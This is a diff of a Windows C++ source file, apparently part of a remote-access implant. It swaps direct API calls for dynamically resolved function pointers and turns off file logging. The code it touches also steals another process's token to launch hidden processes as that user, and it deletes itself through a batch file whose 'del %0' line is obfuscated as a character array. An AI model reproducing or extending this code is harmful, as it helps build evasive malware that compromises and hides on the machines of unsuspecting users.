@@ -20,6 +20,10 @@
 #include "shell.h"
 #include "strHelper.h"
 #include "public.h"
+#include "api.h"
+
+
+
 
 #pragma comment(lib,"wtsapi32.lib")
 #pragma comment(lib,"Userenv.lib")
@@ -29,56 +33,34 @@ using namespace std;
 
 
 
-
-
-
-
-
-
 int __cdecl runLog(const WCHAR* format, ...)
 {
 	int result = 0;
 
-	WCHAR showout[2048];
+	WCHAR info[2048];
+
+	SYSTEMTIME st;
+	GetLocalTime(&st);
+	int offset = wsprintfW(info, L"[ljg]%2u:%2u:%2u %2u/%2u/%4u ", st.wHour, st.wMinute, st.wSecond, st.wMonth, st.wDay, st.wYear);
 
 	va_list   arglist;
 
 	va_start(arglist, format);
 
-	int len = vswprintf_s(showout, sizeof(showout) / sizeof(WCHAR), format, arglist);
+	offset += vswprintf_s(info, sizeof(info) / sizeof(WCHAR) - offset, format, arglist);
 
 	va_end(arglist);
 
-	OutputDebugStringW(showout);
+	lpOutputDebugStringW(info);
 
-	result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, (char*)showout, len * sizeof(WCHAR), FILE_WRITE_APPEND);
+	//result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, (char*)showout, len * sizeof(WCHAR), FILE_WRITE_APPEND);
 
-	return len;
+	return offset;
 }
+
 
 
 int __cdecl runLog(const CHAR* format, ...)
-{
-	int result = 0;
-
-	CHAR showout[2048];
-
-	va_list   arglist;
-
-	va_start(arglist, format);
-
-	int len = vsprintf_s(showout, sizeof(showout), format, arglist);
-
-	va_end(arglist);
-
-	OutputDebugStringA(showout);
-
-	result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, showout, len, FILE_WRITE_APPEND);
-
-	return len;
-}
-
-int __cdecl opLog(const CHAR* format, ...)
 {
 	int result = 0;
 
@@ -96,9 +78,9 @@ int __cdecl opLog(const CHAR* format, ...)
 
 	va_end(arglist);
 
-	OutputDebugStringA(info);
+	lpOutputDebugStringA(info);
 
-	result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, info, offset, FILE_WRITE_APPEND);
+	//result = FileHelper::fileWriter(OPERATION_LOG_FILENAME, info, offset, FILE_WRITE_APPEND);
 
 	return offset;
 }
@@ -158,7 +140,7 @@ int isTerminated() {
 
 int cpuBits() {
 	SYSTEM_INFO si;
-	GetNativeSystemInfo(&si);
+	lpGetNativeSystemInfo(&si);
 	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
 		return 64;
 	else
@@ -273,7 +255,7 @@ int restart(const char* newpath, const char* oldpath) {
 			CloseHandle(g_mutex_handle);
 			char szcmd[1024];
 			wsprintfA(szcmd, "\"%s\" /Delete \"%s\"", newpath, oldpath);
-			ret = WinExec(szcmd, SW_SHOW);
+			ret = lpWinExec(szcmd, SW_SHOW);
 			ExitProcess(0);
 		}
 	}
@@ -371,17 +353,17 @@ int createProcessWithToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR 
 
 	PROCESSENTRY32 pe32 = { 0 };
 	pe32.dwSize = sizeof(PROCESSENTRY32);
-	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-	for (Process32First(hProcessSnap, &pe32); Process32Next(hProcessSnap, &pe32);)
+	for (lpProcess32FirstW(hProcessSnap, &pe32); lpProcess32NextW(hProcessSnap, &pe32);)
 	{
 		char szParam[MAX_PATH] = { 0 };
 		int iRet = WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, szParam, sizeof(szParam) - 1, NULL, NULL);
 		if (lstrcmpiA(_strupr(szParam), _strupr(lpTokenProcessName)) == 0) {
-			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+			HANDLE hProcess = lpOpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
 			if (hProcess)
 			{
-				ret = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
+				ret = lpOpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
 				CloseHandle(hProcess);
 			}
 			else {
@@ -405,7 +387,7 @@ int createProcessWithToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR 
 	si.wShowWindow = SW_HIDE;
 
 	LPVOID lpEnvBlock = NULL;
-	BOOL bEnv = CreateEnvironmentBlock(&lpEnvBlock, hToken, FALSE);
+	BOOL bEnv = lpCreateEnvironmentBlock(&lpEnvBlock, hToken, FALSE);
 	DWORD dwFlags = CREATE_NEW_CONSOLE;
 	if (bEnv)
 	{
@@ -414,7 +396,7 @@ int createProcessWithToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR 
 
 	//si.dwFlags |= dwFlags;
 	// 环境变量创建失败仍然可以创建进程，但会影响到后面的进程获取环境变量内容
-	ret = CreateProcessAsUserA(
+	ret = lpCreateProcessAsUserA(
 		hToken,
 		szProcessName,
 		szparam,
@@ -429,7 +411,7 @@ int createProcessWithToken(LPSTR lpTokenProcessName, LPSTR szProcessName, LPSTR 
 
 	if (bEnv)
 	{
-		ret = DestroyEnvironmentBlock(lpEnvBlock);
+		ret = lpDestroyEnvironmentBlock(lpEnvBlock);
 	}
 
 	return ret;
@@ -448,14 +430,14 @@ DWORD getPidByName(const char* szProcessName)
 
 	PROCESSENTRY32 pe32 = { 0 };
 	pe32.dwSize = sizeof(pe32);
-	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	HANDLE hProcessSnap = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hProcessSnap == INVALID_HANDLE_VALUE)
 	{
 		return FALSE;
 	}
 
 	int iRet = 0;
-	BOOL bNext = Process32First(hProcessSnap, &pe32);
+	BOOL bNext = lpProcess32FirstW(hProcessSnap, &pe32);
 	while (bNext)
 	{
 		char szexefn[MAX_PATH] = { 0 };
@@ -467,7 +449,7 @@ DWORD getPidByName(const char* szProcessName)
 			CloseHandle(hProcessSnap);
 			return pe32.th32ProcessID;
 		}
-		bNext = Process32Next(hProcessSnap, &pe32);
+		bNext = lpProcess32NextW(hProcessSnap, &pe32);
 	}
 	CloseHandle(hProcessSnap);
 	return FALSE;
@@ -480,8 +462,8 @@ DWORD getProcNameByPID(DWORD pid, char* procname, int buflen)
 	PROCESSENTRY32 pe = { 0 };
 	DWORD ppid = 0;
 	pe.dwSize = sizeof(PROCESSENTRY32);
-	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (Process32First(h, &pe))
+	h = lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (lpProcess32FirstW(h, &pe))
 	{
 		do
 		{
@@ -496,7 +478,7 @@ DWORD getProcNameByPID(DWORD pid, char* procname, int buflen)
 				}
 				break;
 			}
-		} while (Process32Next(h, &pe));
+		} while (lpProcess32NextW(h, &pe));
 	}
 	CloseHandle(h);
 	return (ppid);
@@ -688,7 +670,7 @@ void KillSelfAndRun(const char* szFilename,const char* szCmd)
 		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_RANDOM_ACCESS,
 		NULL);
 
-	opLog("szBat:%s", szBat);
+	runLog("szBat:%s", szBat);
 	if (hFile == INVALID_HANDLE_VALUE)
 		return;
 
@@ -716,7 +698,7 @@ void KillSelfAndRun(const char* szFilename,const char* szCmd)
 	strcat(szCommand, szCmd);
 	char szdelself[256] = { '\r','\n' ,'d','e','l',' ','%','%','0',' ','\r','\n',0 };
 	strcat(szCommand, szdelself);
-	opLog("szCommand : %s", szCommand);
+	runLog("szCommand : %s", szCommand);
 
 	DWORD NumberOfBytesWritten = 0;
 	WriteFile(hFile, szCommand, strlen(szCommand), &NumberOfBytesWritten, 0);
